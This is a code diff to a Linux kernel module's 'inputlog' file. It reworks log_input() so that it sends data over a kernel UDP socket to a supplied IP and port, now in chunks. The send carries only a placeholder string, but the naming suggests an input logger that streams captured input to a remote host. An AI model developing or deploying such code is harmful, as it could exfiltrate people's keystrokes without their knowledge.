@@ -3,9 +3,12 @@
 #include <linux/slab.h>
 #include <linux/inet.h>
 #include <net/sock.h>
+#include <net/inet_common.h>
 
 #include "common.h"
 #include "inputlog.h"
+
+#define UDP_MAX_DATA_LEN 65507
 
 struct socket *sock;
 
@@ -17,10 +20,11 @@ log_input(const char *ip, const char *port)
     unsigned long ip_ul;
     unsigned long port_ul;
 
-    int size;
+    int size, flag;
     struct sockaddr_in addr;
     struct msghdr msg;
     struct kvec iov;
+    mm_segment_t fs;
 
     if (sock)
         return;
@@ -37,6 +41,13 @@ log_input(const char *ip, const char *port)
             ip_ul |= (ip_quad[3 - i] & 0xFF) << (8 * i);
     }
 
+    flag = 1;
+    fs = get_fs();
+    set_fs(KERNEL_DS);
+    kernel_setsockopt(sock, SOL_SOCKET, SO_REUSEADDR , (char *)&flag, sizeof(int));
+    kernel_setsockopt(sock, SOL_SOCKET, SO_REUSEPORT , (char *)&flag, sizeof(int));
+    set_fs(fs);
+
     addr.sin_family = AF_INET;
     addr.sin_addr.s_addr = htonl(ip_ul);
     addr.sin_port = htons(port_ul);
@@ -47,9 +58,10 @@ log_input(const char *ip, const char *port)
         return;
     }
 
+    inet_getname(sock, (struct sockaddr *)&addr, 0);
+
     char *buf = "test";
-    iov.iov_base = buf;
-    iov.iov_len = strlen(buf);
+    int buflen = strlen(buf), packlen = 0;
 
     msg.msg_control = NULL;
     msg.msg_controllen = 0;
@@ -57,9 +69,24 @@ log_input(const char *ip, const char *port)
     msg.msg_name = &addr;
     msg.msg_namelen = sizeof(struct sockaddr_in);
 
-    size = kernel_sendmsg(sock, &msg, &iov, 1, strlen(buf));
-    if (size > 0)
-	DEBUG_INFO("[g7] sent %d bytes\n", size);
+    while (buflen > 0) {
+        packlen = (buflen < UDP_MAX_DATA_LEN)
+            ? buflen : UDP_MAX_DATA_LEN;
+
+        iov.iov_len = packlen;
+        iov.iov_base = buf;
+
+        buflen -= packlen;
+        buf += packlen;
+
+        fs = get_fs();
+        set_fs(KERNEL_DS);
+        size = kernel_sendmsg(sock, &msg, &iov, 1, packlen);
+        set_fs(fs);
+
+        if (size > 0)
+            DEBUG_INFO("[g7] sent %d bytes\n", size);
+    }
 }
 
 void
